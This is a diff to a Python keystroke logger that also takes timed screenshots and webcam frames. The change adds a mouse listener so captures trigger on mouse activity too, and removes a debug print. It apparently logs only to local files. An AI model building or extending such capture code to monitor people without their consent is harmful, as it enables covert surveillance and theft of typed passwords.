@@ -1,7 +1,7 @@
 import sys
 from log import logger, screenshot
-from pynput import keyboard
-from pynput.keyboard import Key, Listener, KeyCode, Controller
+from pynput import keyboard, mouse
+from pynput.keyboard import Key, Listener, KeyCode
 from countdown import Countdown
 from util import utilities
 from log import camcapture
@@ -20,23 +20,21 @@ should_capture_screenshots:bool = False
 should_capture_webcam:bool = False
 screenshot_interval:int = 4
 webcam_capture_interval:int = 17
-is_idle:bool = True
+is_keyboard_idle:bool = True
+is_mouse_idle:bool = True
 key_buffer:list[str] = list()
 buffer_capacity:int = 500
 elements_to_preserve:int = 20
 
-lang_change_listener:Listener
-_keyboard = Controller()
-
 
 @catch_exception(print_trace=True)
 def on_pressed(key):
-    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed, is_idle
+    global key_buffer, is_alt_pressed, is_shift_pressed, is_ctrl_pressed, is_keyboard_idle
     if isinstance(key, KeyCode):
         if is_ctrl_pressed or is_alt_pressed:
             __check_for_special_handling(ord(key.char))
         else:
-            is_idle = False
+            is_keyboard_idle = False
             if is_not_paused:
                 key_buffer.append(key.char)
     else:
@@ -45,13 +43,13 @@ def on_pressed(key):
 
         if is_not_paused:
             if key == Key.space:
-                is_idle = False
+                is_keyboard_idle = False
                 key_buffer.append(" ")
             elif key == Key.backspace:
                 if len(key_buffer) > 0:
                     del key_buffer[-1]
             elif key == Key.enter:
-                is_idle = False
+                is_keyboard_idle = False
                 key_buffer.append("\n")
 
     if len(key_buffer) == buffer_capacity:
@@ -68,6 +66,11 @@ def on_release(key):
     elif key == Key.shift_l:
         global is_shift_pressed
         is_shift_pressed = False
+
+
+def on_click(x,y,button,pressed):
+    global is_mouse_idle
+    is_mouse_idle = False
 
 
 def __check_for_combination_key(key) -> bool:
@@ -101,7 +104,7 @@ def __check_for_special_handling(unicode):
 
 
 def __log_buffer(is_dump:bool=False):
-    global key_buffer, elements_to_preserve, is_idle
+    global key_buffer, elements_to_preserve
     if is_dump:
         logger.log_to_file(buffer=key_buffer, is_dump=is_dump)
         key_buffer = list()
@@ -112,27 +115,30 @@ def __log_buffer(is_dump:bool=False):
 
 
 def __check_for_new_characters():
-    global is_idle
+    global is_keyboard_idle
     if is_not_paused:
-        if not is_idle or len(key_buffer) == 0:
-            is_idle = True
+        if not is_keyboard_idle or len(key_buffer) == 0:
+            is_keyboard_idle = True
             return
 
         __log_buffer(is_dump=True)
 
 
 def __take_screenshot():
-    global is_idle
     if is_not_paused:
-        if not is_idle:
+        if not is_keyboard_idle or not is_mouse_idle:
             screenshot.take_screenshot()
 
 
 def __make_cam_capture():
-    global is_idle
     if is_not_paused:
-        if not is_idle:
+        if not is_keyboard_idle or not is_mouse_idle:
             camcapture.capture_cam_frame()
+
+
+def __make_mouse_idle():
+    global is_mouse_idle
+    is_mouse_idle = True
 
 
 def __exit_safely():
@@ -151,6 +157,8 @@ def __init_executors():
         Countdown.make_and_start("screenshots", screenshot_interval * 60, __take_screenshot)
     if should_capture_webcam:
         Countdown.make_and_start("cam capture", webcam_capture_interval * 60, __make_cam_capture)
+    if should_capture_screenshots or should_capture_webcam:
+        Countdown.make_and_start("mouse idle", 7.3 * 60, __make_mouse_idle)
 
 
 def __shutdown_executors():
@@ -178,9 +186,6 @@ def __read_program_args():
                     if intval is None: continue
                     webcam_capture_interval = 1 if intval < 1 else intval
             count += 1
-    print('should screens {} with interval {}  ,  should webcam {}  with interval {}'.format(should_capture_screenshots,
-                                                                                             screenshot_interval,
-                                                                                             should_capture_webcam,                                                                                            webcam_capture_interval))
 
 
 
@@ -189,7 +194,9 @@ def __read_program_args():
 __read_program_args()
 __init_executors()
 
-with keyboard.Listener(on_press=on_pressed, on_release=on_release) as listener:
-    # print(threading.active_count())
-    listener.join()
+with keyboard.Listener(on_press=on_pressed, on_release=on_release) as k_listener, \
+     mouse.Listener(on_click=on_click) as m_listener:
+    m_listener.join()
+    k_listener.join()
+
 
